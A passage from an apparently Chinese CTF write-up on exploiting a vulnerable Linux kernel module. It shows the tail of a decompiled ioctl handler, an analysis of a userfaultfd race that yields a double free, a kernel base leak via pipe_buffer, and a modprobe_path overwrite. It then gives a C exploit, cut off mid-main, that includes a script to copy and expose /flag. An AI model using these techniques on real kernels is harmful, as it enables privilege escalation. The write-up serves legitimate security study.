class="line">  v8 = (<span class="keyword">char</span> *)v7;</span><br><span class="line">  <span class="keyword">if</span> ( !v7 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v9 = copy_from_user(v7, a4.size, <span class="number">0x400</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = (<span class="keyword">int</span>)v9;</span><br><span class="line">    <span class="keyword">if</span> ( !addrList[v9] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ++v9 == <span class="number">0x20</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ++addFlags;</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  addrList[v10] = v8;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里分别是add，del，edit三个功能。并且不存在直接的漏洞，不过题目没有加锁的操作。</p><p>再就是题目所打开的保护是kaslr，kpti，smep，smap四个保护。</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><h3 id="构造double-free"><a href="#构造double-free" class="headerlink" title="构造double free"></a>构造double free</h3><p>我们要知道的是在slab管理器中的指向。<code>slab-&gt;freelist</code>指向的是我们刚刚free掉的object，然后我们的object中间的某个位置修改为原始是<code>slab-&gt;freelist</code>。</p><p>那么按照题目来看如果我们使用userfaultfd在edit的第二个<code>copy_from_user</code>阻塞进程同时在另一个进程free掉刚刚到object，那么我们在缺陷页处理返回新的页时修改掉object中的指针即可。并且这里采用的方法是partial write。</p><h3 id="泄漏基地址"><a href="#泄漏基地址" class="headerlink" title="泄漏基地址"></a>泄漏基地址</h3><p>既然有了double free那么后续就很好办了，这里借用上一篇文章中的思路，我们首先申请sk_buff结构体获得object，随后使用pipe_buffer获取同一块object并把ops写到堆上，那么紧接着只需要将<code>pipe_buffer-&gt;ops</code>读出即可。</p><h3 id="modprobe-path"><a href="#modprobe-path" class="headerlink" title="modprobe_path"></a>modprobe_path</h3><p>详细可以参考这篇文章：<a href="https://cv196082.gitee.io/2022/08/10/starCTF-2019-hackme/">https://cv196082.gitee.io/2022/08/10/starCTF-2019-hackme/</a></p><p>既然我们有了kernel基地址，那么直接根据偏移获取modprobe_path。同样修改object的指针，构造fake_object指向modprobe_path即可。</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCKET_NUM 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SK_BUFF_NUM 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_NUM 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_NUM2 16</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> page;</span><br><span class="line">    <span class="keyword">uint32_t</span> offset, len;</span><br><span class="line">    <span class="keyword">uint64_t</span> ops;</span><br><span class="line">    <span class="keyword">uint32_t</span> flags;</span><br><span class="line">    <span class="keyword">uint32_t</span> padding;</span><br><span class="line">    <span class="keyword">uint64_t</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> confirm;</span><br><span class="line">    <span class="keyword">uint64_t</span> release;</span><br><span class="line">    <span class="keyword">uint64_t</span> try_steal;</span><br><span class="line">    <span class="keyword">uint64_t</span> get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page, <span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;</span><br><span class="line">    ur.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">edit_handle</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>)arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] edit handler created&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] edit handler unblocked&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> *page = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">        <span class="comment">// init page</span></span><br><span class="line">        <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">        *(page + <span class="number">0x201</span>) = <span class="number">0x64</span>;</span><br><span class="line"></span><br><span class="line">        uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">        uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp;</span><br><span class="line">                 ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uc.len = <span class="number">0x1000</span>;</span><br><span class="line">        uc.mode = <span class="number">0</span>;</span><br><span class="line">        uc.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uc) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] edit handler done&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">add_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> idx;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">edit_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> idx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">del_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> idx;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">add_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.idx = <span class="number">0</span>;</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, <span class="number">0x20</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">del</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">del_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, <span class="number">0x30</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> idx, <span class="keyword">unsigned</span> <span class="keyword">long</span> size, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">edit_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    arg.size = size;</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, <span class="number">0x50</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">100</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_mod</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;mkdir -p /tmp&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh&#x27; &gt; /tmp/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;cp /flag /tmp/myflag&#x27; &gt;&gt; /tmp/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;chmod 777 /tmp/myflag&#x27; &gt;&gt; /tmp/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/copy.sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xFF\\xFF\\xFF\\xFF&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">char</span> *page = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> pipe_fd2[PIPE_NUM2][<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="keyword">char</span> sk_buf[<span class="number">704</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> modprobe_path;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *pointer_buf;</span><br><span 